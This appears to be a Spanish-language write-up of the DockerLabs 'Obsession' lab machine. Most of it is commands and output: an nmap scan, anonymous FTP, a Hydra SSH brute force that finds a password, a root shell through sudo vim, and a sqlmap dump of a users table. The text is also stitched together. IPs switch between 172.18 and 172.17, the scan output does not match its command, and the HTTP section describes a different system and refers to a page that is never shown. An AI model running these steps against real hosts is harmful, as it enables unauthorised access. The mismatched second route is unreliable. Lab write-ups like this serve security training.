# OBSESSION
## INDICACIONES PREVIAS
* Sistema operativo: Kali Linux
* Terminal: ZSH Powerlevel10K
* Utilidad mkt definida en la zshrc para la creación automática de directorios nmap, content y scripts.
* Cat aliseado como bat.
## DESPLIEGUE DE MÁQUINA
1. Descargarla desde la plataforma DockerLabs.
2. En mi caso, yo me creo un directorio con el nombre de la máquina para tenerlo todo más organizado, por lo que mediante el comando mv (`mv ~/Downloads/<máquina.zip> ~/Desktop/Máquinas/Dockerlabs/<máquina>`) la moveré de descargas a la nueva ubicación.
3. Una vez hecho esto, la descomprimiremos mediante unzip <máquina.zip> y se nos creará un ejecutable .tar
4. Por último, la desplegaremos mediante sudo bash auto_deploy.sh <máquina.tar> y se nos proporcionará una IP, en mi caso 172.18.0.2.
## EXPLOTACIÓN Y ESCALADA DE PRIVILEGIOS
Primero comprobaremos la conectividad con la máquina. 
```ruby
> ping -c1 172.18.0.2
PING 172.17.0.2 (172.18.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=4.45 ms

--- 172.18.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 4.447/4.447/4.447/0.000 ms
```

* c1 (count 1) para indicar que solo queremos mandar un paquete ICMP y después termine de enviar paquetes. 

* De aquí podemos observar que: 
  * Se ha enviado un paquete y se ha recibido de vuelta, por lo que hay conectividad con la máquina.
  * Tenemos un ttl = 64, lo que quiere decir que nos encontramos ante un sistema Linux.

Una vez visto que tenemos conectividad comenzaremos con el escaneo de puertos.  Para ello ejecutaremos:
```ruby
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts
```
* Con -p- escaneamos el rango completo de puertos (65535).
* Con --open añadimos que de esos solo nos interesan los abiertos.
* Con -sS seleccionamos que el tipo de escaneo será de tipo SYN Scan. Este se caracteriza por ser rápido y sigiloso puesto que no se completa el three-way handshake.
  * Según la respuesta del puerto, Nmap deduce su estado:
    * SYN/ACK recibido → el puerto está abierto.
    * RST (Reset) recibido → el puerto está cerrado.
    * Sin respuesta o ICMP error → el puerto está filtrado (por firewall).
  * Si el puerto estaba abierto (SYN/ACK), Nmap no completa la conexión: envía un RST para interrumpir el handshake y no dejar un rastro evidente.
* Con --min-rate 5000 indicamos que queremos un envío de 5000 paquetes por segundo.
* Con -vvv (triple verbose) se muestra por consola la información detallada y actualizada al momento.
* Con -n indicaremos que no queremos resolución DNS, trabajaremos directamente con direcciones IP.
* Con -Pn queremos que no se haga ping al host antes de comenzar el escaneo, asumiendo que está activo.
* Por último, con -oG exportamos la evidencia en un archivo con formato grepeable para facilitar su procesamiento en auditorias.

Para simplificarnos el visionado de los puertos abiertos directamente abriremos el archivo *allPorts*.
```ruby
❯ cat allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allPorts
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Tue Sep 16 12:27:58 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 172.17.0.2 () Status: Up
   4   │ Host: 172.17.0.2 () Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///   Ignored State: closed (65532)
   5   │ # Nmap done at Tue Sep 16 12:28:01 2025 -- 1 IP address (1 host up) scanned in 2.96 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Una vez localizados los puertos abiertos, continuaremos con el escaneo específico de los mismos para ver que servicios y versiones corren por ellos.
```bash
❯ nmap -p22,80 -sCV 172.18.0.2 -oN targeted
```

* El parámetro -sCV es una conjunción de los parámetros:
  * -sC: Ejecuta los scripts de Nmap por defecto (Default Scripts) para el host/puerto para detectar vulnerabilidades básicas, información de banners, servicios públicos, etc..
  * -sV: Detecta la versión del servicio que corre en cada puerto abierto.
* Con -oN exportamos la evidencia en un archivo con formato Nmap para dejarlo registrado.

Al igual que antes, para que la visualización de toda la información sea más cómoda, la analizaremos desde el archivo *targeted* que acabamos de generar.
```java
❯ cat targeted -l java
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targeted
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Tue Sep 16 12:28:32 2025 as: /usr/lib/nmap/nmap --privileged -p21,22,80 -sCV -oN targeted 172.17.0.2
   2   │ Nmap scan report for 172.17.0.2
   3   │ Host is up (0.00s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 21/tcp open  ftp     vsftpd 3.0.5
   7   │ | ftp-syst: 
   8   │ |   STAT: 
   9   │ | FTP server status:
  10   │ |      Connected to ::ffff:172.17.0.1
  11   │ |      Logged in as ftp
  12   │ |      TYPE: ASCII
  13   │ |      No session bandwidth limit
  14   │ |      Session timeout in seconds is 300
  15   │ |      Control connection is plain text
  16   │ |      Data connections will be plain text
  17   │ |      At session startup, client count was 2
  18   │ |      vsFTPd 3.0.5 - secure, fast, stable
  19   │ |_End of status
  20   │ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  21   │ | -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
  22   │ |_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
  23   │ 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
  24   │ | ssh-hostkey: 
  25   │ |   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
  26   │ |_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
  27   │ 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
  28   │ |_http-server-header: Apache/2.4.58 (Ubuntu)
  29   │ |_http-title: Russoski Coaching
  30   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
  31   │ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  32   │ 
  33   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  34   │ # Nmap done at Tue Sep 16 12:28:40 2025 -- 1 IP address (1 host up) scanned in 7.76 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Esta máquina tiene dos formas fáciles de resolverse:

### 1. EXPLOTACION FTP
En el puerto 22 nos encontramos con un servicio *OpenSSH* actualizado a una versión relativamente reciente, lo que indica que no presenta ninguna vulnerabilidad conocida (versiones < 7.7).  Continuaremos con el servicio FTP, el cual pasaremos por la herramienta [SearchSploit](https://github.com/topics/searchsploit) para ver si presenta alguna vulnerabilidad.
```ruby
❯ searchsploit "vsftpd 3.0.5"
Exploits: No Results
Shellcodes: No Results
```
Este servicio tampoco presenta ninguna vulnerabilidad conocida pero sí que permite el login con usuario *Anónimo*.  Vamos a ver que encontramos.

```ruby
❯ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls 
229 Entering Extended Passive Mode (|||20864|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
226 Directory send OK.
ftp> mget chat-gonza.txt pendientes.txt
mget chat-gonza.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||48381|)
150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).
100% |************************************************************************************************************************************************|   667        0.65 KiB/s    --:-- ETA
226 Transfer complete.
667 bytes received in 00:00 (0.65 KiB/s)
mget pendientes.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||59834|)
150 Opening BINARY mode data connection for pendientes.txt (315 bytes).
100% |************************************************************************************************************************************************|   315        0.30 KiB/s    --:-- ETA
226 Transfer complete.
315 bytes received in 00:00 (0.30 KiB/s)
```
Podemos observar que el login anónimo ha dado resultado y nos hemos encontrado con dos archivos de texto los cuales, haciendo uso del comando `mget`, nos los hemos traidoa nuestra máquina Kali.

```bash
❯ cat chat-gonza.txt pendientes.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: chat-gonza.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ [16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
   2   │ [16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
   3   │ [16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
   4   │ [21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
   5   │ [21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
   6   │ [22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pendientes.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!
   2   │ 
   3   │ 2 Aumentar el precio de mis asesorías online en la Web!
   4   │ 
   5   │ 3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!
   6   │ 
   7   │ 4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
   8   │   permisos habilitados que no son del todo seguros..
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────```
```
En el primer archivo nos encontramos con lo que parece un chat entre dos usuarios de sistema, *Gonza* y *Russoski*.  Por el uso de la primera persona del singular puedo interpretar que estamos tomando el papel de Russoski.  Además, en el segundo archivo se nos esta desvelando que con este usuario de sistema tenemos unos permisos habilitados así que, vamos a probar en el servicio *OpenSSH*.

Haremos uso de la herramienta de fuerza bruta [Hydra](https://github.com/vanhauser-thc/thc-hydra) utilizando *russoski* como nombre de usuario y el diccionario [rockyou](https://github.com/topics/rockyou-wordlist) para comprobar contraseñas.
```py
❯ hydra -l russoski -P /usr/share/wordlists/rockyou.txt -f ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-16 12:53:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-16 12:54:21
```
* Con -l seleccionamos el usuario.
* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.

Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *russoski*.
Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
```ruby
❯ ssh russoski@172.17.0.2
russoski@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.12.38+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Sep 16 13:15:06 2025 from 172.17.0.1
russoski@9cc448a7c0a7:~$ whoami
russoski
``` 

Una vez dentro de la máquina víctima, vamos a intentar listar todos los privilegios de sudo del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo. 
```ruby
russoski@9cc448a7c0a7:~$ sudo -l
Matching Defaults entries for russoski on 9cc448a7c0a7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User russoski may run the following commands on 9cc448a7c0a7:
    (root) NOPASSWD: /usr/bin/vim
```
Sabiendo que podemos ejecutar Vim[^1] con permisos de administrador, podemos buscar en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) alguna forma de establecer una shell remota, puesto que esta se ejecutará con los permisos del usuario que la haya lanzado. 
![GTFOBins vim](https://github.com/JavieRR13/WriteUps/blob/15cc9e2a9780218e32fb4a67bedf059c0229067a/DockerLabs/Muy%20f%C3%A1cil/Obsession/Im%C3%A1genes/Obsession_GTFOBinsvim.png)
```ruby
russoski@9cc448a7c0a7:~$ sudo vim -c ':!/bin/sh'

# whoami
root
# 
```
🥳CONSEGUIDO, SOMOS ROOT🥳
[^1]: Vim es un editor de texto para sistemas Unix/Linux que, al poder ejecutarse con sudo, se convierte en una vía de escalada de privilegios porque permite lanzar comandos de sistema desde dentro del editor (por ejemplo con :!bash), lo que posibilita abrir una shell con permisos de root.
____________________________________________________________________________________________
### 2. ANALISIS HTTP
La otra opción sería analizar el servicio web.  Para ello nos dirigimos al navegador y escribimos la dirección IP en el buscador.  Esto nos llevará a un sitio web de lo que parece ser publicidad deportiva con un formulario.
![Formulario web]()
![Respuesta de formulario]()
```bash
> sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch
[20:07:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:07:01] [INFO] fetching database names
[20:07:01] [INFO] retrieved: 'information_schema'
[20:07:01] [INFO] retrieved: 'register'
[20:07:01] [INFO] retrieved: 'sys'
[20:07:01] [INFO] retrieved: 'mysql'
[20:07:01] [INFO] retrieved: 'performance_schema'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] register
[*] sys

[20:07:01] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0805pm.csv'

[*] ending @ 20:07:01 /2025-09-07/
```   
* Con -u indicamos la url.
* --forms le dice a sqlmap que busque formularios en la página (inputs, login forms, búsqueda, etc.) y trate de inyectar SQL allí.
* Con --dbs indicamos que queremos listar las bases de datos disponibles si encuentra una inyección exitosa.
* Con --batch indicamos a sqlmap que no nos pregunte  durante el ataque, sino que asuma respuestas por defecto. Es útil para automatizar el proceso en scripts o pruebas largas.

Bien, hemos encontrado la base de datos *register* así que accedemos a ella y listamos las tablas que pueda haber.

```bash
> sqlmap -u http://172.17.0.2 --forms -D register --tables --batch
[20:15:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:15:29] [INFO] fetching tables for database: 'register'
[20:15:29] [INFO] retrieved: 'users'
Database: register
[1 table]
+-------+
| users |
+-------+

[20:15:29] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0815pm.csv'

[*] ending @ 20:15:29 /2025-09-07/
```
Esto nos ha indicado que en esta base de datos hay una tabla que se llama *users*, la cual, sospechosamente, puede contener usuarios.  Ahora que ya tenemos la tabla, lo que nos interesa es conseguir las columnas, así que ejecutamos:
```bash
> sqlmap -u http://172.17.0.2 --forms -D register -T users --columns --batch
[20:20:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:20:43] [INFO] fetching columns for table 'users' in database 'register'
[20:20:43] [INFO] retrieved: 'username'
[20:20:43] [INFO] retrieved: 'varchar(30)'
[20:20:43] [INFO] retrieved: 'passwd'
[20:20:43] [INFO] retrieved: 'varchar(30)'
Database: register
Table: users
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| passwd   | varchar(30) |
| username | varchar(30) |
+----------+-------------+

[20:20:43] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0820pm.csv'

[*] ending @ 20:20:43 /2025-09-07/
```
Ya por último sería acceder a los datos de las dos columnas que hemos encontrado así que ejecutamos: 
```bash
> sqlmap -u http://172.17.0.2 --forms -D register -T users -C passwd,username --dump --batch
[20:22:38] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:22:38] [INFO] fetching entries of column(s) 'passwd,username' for table 'users' in database 'register'
[20:22:38] [INFO] retrieved: 'KJSDFG789FGSDF78'
[20:22:38] [INFO] retrieved: 'dylan'
Database: register
Table: users
[1 entry]
+------------------+----------+
| passwd           | username |
+------------------+----------+
| KJSDFG789FGSDF78 | dylan    |
+------------------+----------+

[20:22:38] [INFO] table 'register.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/172.17.0.2/dump/register/users.csv'
[20:22:38] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0822pm.csv'

[*] ending @ 20:22:38 /2025-09-07/
```
* Con --dump volcamos la información de las columnas que acabamos de inyectar.

Vemos que nos ha devuelto un usuario *dylan* y una contraseña *KJSDFG789FGSDF78* así que lo probaremos en el formulario web a ver que sucede.  En este caso nos devuelve a la misma página de *http://172.17.0.2/acceso_valido_dylan.php* que hemos visto en la primera forma de resolver esta máquina así que, a partir de aquí el resto de la máquina será igual.

(------------------------------------A PARTIR DE AQUÍ, LA FORMA DE ESCALAR PRIVILEGIOS SERÁ LA MISMA------------------------------------)


























🥳CONSEGUIDO, SOMOS ROOT🥳
